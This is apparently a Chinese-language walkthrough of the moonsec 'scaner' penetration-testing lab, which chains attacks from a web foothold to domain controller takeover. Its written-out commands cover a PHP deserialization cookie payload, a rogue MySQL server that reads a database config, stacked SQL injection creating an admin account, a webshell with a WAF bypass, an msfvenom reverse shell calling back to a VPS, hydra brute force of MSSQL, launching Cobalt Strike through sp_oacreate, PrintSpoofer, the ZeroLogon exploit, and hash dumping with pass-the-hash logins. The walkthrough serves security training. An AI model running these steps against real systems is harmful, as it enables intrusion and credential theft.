<span class="title">__construct</span>(<span class="params"><span class="variable">$crypt_key</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span> -&gt; crypt_key = <span class="variable">$crypt_key</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_encrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">srand</span>((<span class="keyword">double</span>)<span class="title function_ invoke__">microtime</span>() * <span class="number">1000000</span>);</span><br><span class="line">	   <span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">32000</span>));</span><br><span class="line">	   <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>].(<span class="variable">$txt</span>[<span class="variable">$i</span>]^<span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="variable">$tmp</span>,<span class="variable">$this</span> -&gt; crypt_key));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_decrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$txt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>),<span class="variable">$this</span> -&gt; crypt_key);</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$md5</span> = <span class="variable">$txt</span>[<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[++<span class="variable">$i</span>] ^ <span class="variable">$md5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__key</span>(<span class="params"><span class="variable">$txt</span>,<span class="variable">$encrypt_key</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$encrypt_key</span>);</span><br><span class="line">	   <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span> -&gt; crypt_key = <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_decrypt</span>(<span class="variable">$name</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params"><span class="variable">$args</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class="line">	<span class="variable">$value</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$args</span>);</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_encrypt</span>(<span class="variable">$value</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">\Think\Image\Driver\Imagick</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">set_cookie</span>(<span class="variable">$b</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2B&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="B8FVni6cWgnLewRSeUdYCcaM_aEAVqOR6re3Waas-YA.png" alt="image"></p>
<p>VPS进行监听：</p>
<p>python rogue_mysql_server.py</p>
<p><img src="oSHhuBG6-zHtCordotB0b1TjS2DjWeQlg4UUUJ27DHg.png" alt="image"></p>
<p>发送构造好的payload</p>
<p><img src="XtARS5xrVg26S3AGPxkrRsQ6zsN6pNka9bTyMlqgG4c.png" alt="image"></p>
<p>VPS上查看日志：</p>
<p><img src="mv7ty5hN_84pMahlQnrviDZkhn4kupl1XzodsaB_Oj8.png" alt="image"></p>
<p>拿到数据库的配置文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x02&lt;?php return array (\n  &#x27;DB_TYPE&#x27; =&gt; &#x27;mysqli&#x27;,\n  &#x27;DB_HOST&#x27; =&gt; &#x27;127.0.0.1&#x27;,\n  &#x27;DB_PORT&#x27; =&gt; &#x27;3306&#x27;,\n  &#x27;DB_USER&#x27; =&gt; &#x27;root&#x27;,\n  &#x27;DB_PWD&#x27; =&gt; &#x27;9a973fd7928bb3c2&#x27;,\n  &#x27;DB_NAME&#x27; =&gt; &#x27;www_xycms_com&#x27;,\n  &#x27;DB_PREFIX&#x27; =&gt; &#x27;xyh_&#x27;,\n  &#x27;DB_CHARSET&#x27; =&gt; &#x27;utf8&#x27;,\n);?&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="堆叠插入管理员用户"><a href="#堆叠插入管理员用户" class="headerlink" title="堆叠插入管理员用户"></a>堆叠插入管理员用户</h2><p>账号：sfmtql</p>
<p>密码：xxxxxx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;id=0;insert into xyh_admin (id,username,password,encrypt,user_type,is_lock,login_num) VALUES (61,&#x27;sfmtql&#x27;,&#x27;d4404a35b6d63a48d3b15f9bb5ffb6ba&#x27;,&#x27;WDdJDu&#x27;,9,0,4);&quot;</span> </span><br></pre></td></tr></table></figure>
<h2 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h2><p>添加个html</p>
<p><img src="csmEOScQV0feKNYmSbSAmiStrbzRiFitk8A_ii5xlek.png" alt="image"></p>
<p>&#x2F;uploads&#x2F;abc1&#x2F;20220522&#x2F;62891648bfa06.html</p>
<p><img src="hLRd5XlYlxBBYGnE5Lwt-oV5WtKvE1C4YDi5SOh44P0.png" alt="image"></p>
<p><img src="5IWelP2sVKFetOggLmm85OQvRw5VIUCcNl11T1hJLcU.png" alt="image"></p>
<p>至此成功getshell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h3 id="蚁剑流量绕过宝塔"><a href="#蚁剑流量绕过宝塔" class="headerlink" title="蚁剑流量绕过宝塔"></a>蚁剑流量绕过宝塔</h3><p>到这里的时候，使用蚁剑连接一直被办，找到了敏感词为“eval”，后面使用了参数污染添加脏数据，当我发包六万多的时候，成功绕过，最后上传一个base64的马进行连接就不会被拦了。</p>
<h3 id="PHP-FPM绕过disable"><a href="#PHP-FPM绕过disable" class="headerlink" title="PHP-FPM绕过disable"></a>PHP-FPM绕过disable</h3><p>尝试了很多中绕过之后，发现这种方式可以绕过，一天晚上尝试失败了很多次，莫名其妙发现第二天就好了。</p>
<p>查看fpm的配置文件（&#x2F;www&#x2F;server&#x2F;php&#x2F;56&#x2F;etc&#x2F;php-fpm.conf）可以拿到php-fpm的位置</p>
<p><img src="3RXKfH7Ggq3M4PMlHI8YpbQc0MupqM5LRt_dO7jpHCg.png" alt="image"></p>
<p>成功</p>
<p><img src="fGZDrkPNwgfSmUCpEor1cjmyRN610YH_3ueCUQdWa7o.png" alt="image"></p>
<p>创建副本之后成功连接。</p>
<p><img src="-PsNJr9G--N4mA2pZjAIEX4UgOLDJz002glz3KrBdwA.png" alt="image"></p>
<p>后来觉得中国蚁剑不好用，就改用哥斯拉了。</p>
<p><img src="LkDh5DVi8J-B3exv3wa6L4Ya8opzJP9rbp8H810GvOA.png" alt="image"></p>
<p><img src="R2CSEktkUv_Yc5Esl-tC71x3bHM88WtQZDZyRKh_Gzg.png" alt="image"></p>
<h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><p>生成攻击载荷</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=vps LPORT=<span class="number">4382</span> -f elf &gt;/root/moonsec/<span class="number">2020</span>/project/zhinan</span><br></pre></td></tr></table></figure>
<p>开始监听</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">multi</span>/<span class="title">handler</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">linux</span>/<span class="title">x86</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span><br><span class="line"><span class="title">set</span> <span class="title">LHOST</span> 192.168.8.133</span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> 13777</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>
<p>开启frp映射本地的13777到vps的4382</p>
<p>将文件上传到添加执行权限，使用哥斯拉执行即可获取到一个session</p>
<h3 id="提权为root"><a href="#提权为root" class="headerlink" title="提权为root"></a>提权为root</h3><p>通过上传脚本linux-exploit-suggeter.sh执行之后，能查到该服务器的一些基本信息和一些提权的CVE</p>
<p><img src="7iOKc_4gkq980n4NvudBVS1R4nnJt2fTX2RAXmaggV0.png" alt="image"></p>
<p>网上搜索了一下18.04 ubuntu的提权，找到了下面的文章</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gh0stf1re/article/details/116193906">https://blog.csdn.net/gh0stf1re/article/details/116193906</a></p>
<p>然后进行上传exp.c编译之后提权</p>
<p><code>gcc exp.c -o exp</code></p>
<p><code>./exp</code></p>
<p><code>sudo su切换到了root</code></p>
<p><img src="3bKhvlYypWqsdO-qoTJdfnvshGWSXMYH3U5IQli6xKA.png" alt="image"></p>
<p><img src="STVtcNugZ7eAtYa--jHPilUMxNEB-istIuiZKUKw37A.png" alt="image"></p>
<p>在根目录获取到了当前的flag</p>
<p><img src="txCZrvymtSdJNKq0o_i9aBq3Z2TDK0xtfbS57YtC9xU.png" alt="image"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moonsec_flag&#123;moonsec-<span class="number">30</span>db331044bc750a76da6dbf9e2ae190&#125;</span><br></pre></td></tr></table></figure>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>cat &#x2F;etc&#x2F;hosts 没发现什么网站</p>
<p><img src="4GZ2YHJxtzYQjitVxWRkxv3c7a32_eDigwzMx2C5SBs.png" alt="image"></p>
<p>arp -a 也没发现什么IP</p>
<p><img src="BYCQEOfsdKNaYxc3jrsTq6cvNIxQ97ELS28MWxMU5wI.png" alt="image"></p>
<p>metasploit 设置代理进入内网</p>
<p>run autoroute -s 192.168.52.0&#x2F;24</p>
<p><img src="GeOukDPTulVZ0JpkJan6sQPyrObTEUZ7R1ejZlDY4ms.png" alt="image"></p>
<p>启动 socks 模块</p>
<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>
<p>set SRVPORT 22335</p>
<p>run</p>
<p><img src="D8OlFqtWVDKVzJI1hbIrWNV18lzdA67CpQ0X255JcjU.png" alt="image"></p>
<p>发现使用代理扫描太慢了，这就直接在目标安装一个nmap然后进行开扫。</p>
<p>sudo apt install nmap</p>
<p><img src="OHbsxsWPRDPcX07rVLb8PB5m-TXZhLopv4lKDQIq3PU.png" alt="image"></p>
<p>探测到存活的IP：192.168.52.128</p>
<p><img src="I04ti2D6FWvj6EIBgtbY0mhPYwZGOWLptH19lrCbkaY.png" alt="image"></p>
<p>扫描端口信息，就只发现了一个1433的mssql端口，没发现web</p>
<p><img src="nu8fs3DYv54nI_vsUquJmZNn56oSd3vhh4LsUxZEOE4.png" alt="image"></p>
<p><img src="C71x7UxgDlDHLHMyDngbiFLMjQg6zZcANRaFNA7k_4g.png" alt="image"></p>
<h3 id="hydra爆破sqlserver"><a href="#hydra爆破sqlserver" class="headerlink" title="hydra爆破sqlserver"></a>hydra爆破sqlserver</h3><p>翻了一圈服务器没找到什么敏感的信息可以利用，只能尝试进行爆破了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains hydra <span class="number">192.168</span>.<span class="number">52.128</span> mssql -l sa  -P /root/moonsec/<span class="number">2020</span>/project11/top1000-moon.txt -vV -f</span><br></pre></td></tr></table></figure>
<p>运气还是比较好的，爆破出来了</p>
<p><img src="qwoc2No8vTqDMLfk8BUehvdICGy1T-KPzcLSU7ty8to.png" alt="image"></p>
<p>使用msf的模块进行攻击之后，发现有些命令不能执行，就只能执行了whoami，不知道是不是msf6的毛病</p>
<p><img src="Jn00cEcF4rNM6lBIxjDN-JlguNcfIqlCT5OttTjovJM.png" alt="image"></p>
<h3 id="natvicat客户端连接mssql"><a href="#natvicat客户端连接mssql" class="headerlink" title="natvicat客户端连接mssql"></a>natvicat客户端连接mssql</h3><p>下载natvicat，然后让其走隧道代理去连接目标</p>
<p><img src="9pd4iJnJ7jMQMKLSXfJwTDgbru8y3LAwn7N9FOZoJzw.png" alt="image"></p>
<p>使用xpcmdshell执行以下命令，可以创建文件夹了</p>
<p><img src="UjfVfqimOexOWlSs-WgDwpre8CvnXStf0vcfbt4iWFc.png" alt="image"></p>
<p>尝试下载生成的木马，发现没用权限，拒绝访问</p>
<p><img src="nfI_4BLL_UeR0WLSMxO2ZS68zoEsUqPHq02HakyaonU.png" alt="image"></p>
<p>尝试powershell上线CS，成功上线</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @shell <span class="keyword">int</span> exec sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@shell output exec sp_oamethod @shell,<span class="string">&#x27;run&#x27;</span>,<span class="literal">null</span>,<span class="string">&#x27;powershell上线内容&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="Y16Fr2UfEVNPHEDfaIm7wUs1WDHAifxi_17-UgZTuEI.png" alt="image"></p>
<p><img src="aquBLN7lk1bUHUfvD0VzlDEjQrbtBAUl3bVV2wRFmrg.png" alt="image"></p>
<p>派生一个给msf</p>
<p>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>
<p>set lhost 192.168.8.133</p>
<p> set lport 13782</p>
<p><img src="aGD3koKShSC4eO9FIGA5eGH7RhaBH1ucK_oBiq4JbbQ.png" alt="image"></p>
<p>提权</p>
<p>当前权限只是数据库权限，需要提权为system，这里使用PrintSpoofer</p>
<p><img src="x0RLhe8FKCkAuqXUHEPkLmZtBIYcxQKSW6QaFQ8M9d4.png" alt="image"></p>
<p>然后再上线一个system权限的session</p>
<p><img src="e8VGwT0kwymRqvplCrxidSuN38xz-ftlBGj-uJkxkT8.png" alt="image"></p>
<p>导出hash</p>
<p><img src="WrB273TRZOFdjOsTfRZ0llY74lgqf8f3iWCHCRD-W9k.png" alt="image"></p>
<p>破解到密码</p>
<p><img src="kEPafJaATAswZpZgVncpDOXKjtqRWGbcfieBHfIxoBQ.png" alt="image"></p>
<p>查看flag</p>
<p>type root.txt</p>
<p>moonsec_flag{moonsec-557be9af7d66991560155201dc521627}</p>
<p><img src="Q1UlhkwoygUgscOObw4lAlUoo5U2SL1RPTZInYzO6uU.png" alt="image"></p>
<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="0pCg677i6cLEu3f22OL_SfY_Ee0RjPH1yxblWo-NaF0.png" alt="image"></p>
<p><img src="XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png" alt="image"></p>
<p><img src="DxJumeqo0NIv_I76J-YPhrb5WUsJd37TFZjPKsK2Uy8.png" alt="image"></p>
<p>判断出是有域的，且为scaner.sec，域控名称为ad.scaner.sec</p>
<p>查看系统信息</p>
<p><img src="XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png" alt="image"></p>
<p>arp -a</p>
<p><img src="o1r7TvvmDGhrfiu3GgCIL9hwAHzpKaKs0yO6ITa36OA.png" alt="image"></p>
<p>查看用户信息，没发现域用户</p>
<p><img src="vvjP-3rte4i5egKEKwDpGFMogGF-ohOYSL2uiamslcQ.png" alt="image"></p>
<p>也没有域用户的进程</p>
<p><img src="hf4SHpxlcyxWg6QKBa6JuIv6jY1mC0_-ts2elqVy5W0.png" alt="image"></p>
<h2 id="cve-2020-1472拿下域控"><a href="#cve-2020-1472拿下域控" class="headerlink" title="cve-2020-1472拿下域控"></a>cve-2020-1472拿下域控</h2><p>分析了以下前面的信息，目前能到权限，知道域控名称和域的一些信息，但是没有拿到一个域的普通用户，这时候想起了置空漏洞，这个漏洞不需要普通的域用户就可以打。</p>
<p>走代理打域控</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ./cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py ad <span class="number">10.10</span>.<span class="number">10.135</span></span><br></pre></td></tr></table></figure>
<p><img src="vlZhm2FLGS_qLHLXwAuGSuxdY--o4jIVD_nxXxi3od4.png" alt="image"></p>
<p>发现成功了，有些惊喜，在预料之后也在预料之外</p>
<p><img src="vUUw8TyUOu189TGuc8YWqP2wbVyufByk38dZZnJWP38.png" alt="image"></p>
<h3 id="Impacket-secretsdump-获取域控哈希"><a href="#Impacket-secretsdump-获取域控哈希" class="headerlink" title="Impacket secretsdump 获取域控哈希"></a>Impacket secretsdump 获取域控哈希</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 secretsdump.py scaner.sec/ad\$@<span class="number">10.10</span>.<span class="number">10.135</span> -just-dc -hashes :</span><br></pre></td></tr></table></figure>
<p><img src="CvxJcyJU5HIFSCEbT2kSqLmUZ5A2i_7jjWIQGsXpF-k.png" alt="image"></p>
<h3 id="通过-smbexec-登录域控制器"><a href="#通过-smbexec-登录域控制器" class="headerlink" title="通过 smbexec 登录域控制器"></a>通过 smbexec 登录域控制器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">35</span>dc382e7d31f6823c2e34216d4c15cb administrator@<span class="number">10.10</span>.<span class="number">10.135</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="47drsqGtQDe_awys4QZYi7lg_C9dMxziC6HU56xBJwo.png" alt="image"></p>
<p><img src="kJeZm6w7d-oxvFuOtMqCmyGSrX3IAR5AGXBQEzUm6pU.png" alt="image"></p>
<p>拿到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\root.txt</span><br><span class="line">C:\Windows\system32&gt;type C:\Users\Administrator\root.txt</span><br><span class="line">moonsec_flag&#123;moonsec-<span class="number">8</span>aff4877eb76417460c0fc7f84b32566&#125;</span><br></pre></td></tr></table></figure>
<p><img src="UdDZbU-TmNDduh7SdqVM6tX9M8nmHhF0JkHVgAfc0fM.png" alt="image"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">文章</a></li>
        
          <li><a href="/categories/">分类</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.</span> <span class="toc-text">scaner从外网到拿下域控</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞整理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BAxyhcms%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">在本地搭建xyhcms进行测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.1.</span> <span class="toc-text">前台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.3.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8FMySQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.3.</span> <span class="toc-text">恶意MySQL服务器读取数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EMySQL%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">3.3.4.</span> <span class="toc-text">反序列化漏洞MySQL日志写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BA%BF%E4%B8%8A%E7%8E%AF%E5%A2%83"><span class="toc-number">3.3.5.</span> <span class="toc-text">尝试线上环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%AE%9D%E5%A1%94%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95"><span class="toc-number">3.4.</span> <span class="toc-text">本地搭建宝塔环境测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.4.1.</span> <span class="toc-text">代码审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">外部打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%8B%BFkey"><span class="toc-number">4.1.</span> <span class="toc-text">SQL注入拿key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">反序列化漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8FMySQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6-1"><span class="toc-number">4.3.</span> <span class="toc-text">恶意MySQL服务器读取数据库文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%8F%92%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">4.4.</span> <span class="toc-text">堆叠插入管理员用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">4.5.</span> <span class="toc-text">文件包含getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87%E5%AE%9D%E5%A1%94"><span class="toc-number">5.0.1.</span> <span class="toc-text">蚁剑流量绕过宝塔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-FPM%E7%BB%95%E8%BF%87disable"><span class="toc-number">5.0.2.</span> <span class="toc-text">PHP-FPM绕过disable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.0.3.</span> <span class="toc-text">msf反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%BAroot"><span class="toc-number">5.0.4.</span> <span class="toc-text">提权为root</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">6.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">6.0.1.</span> <span 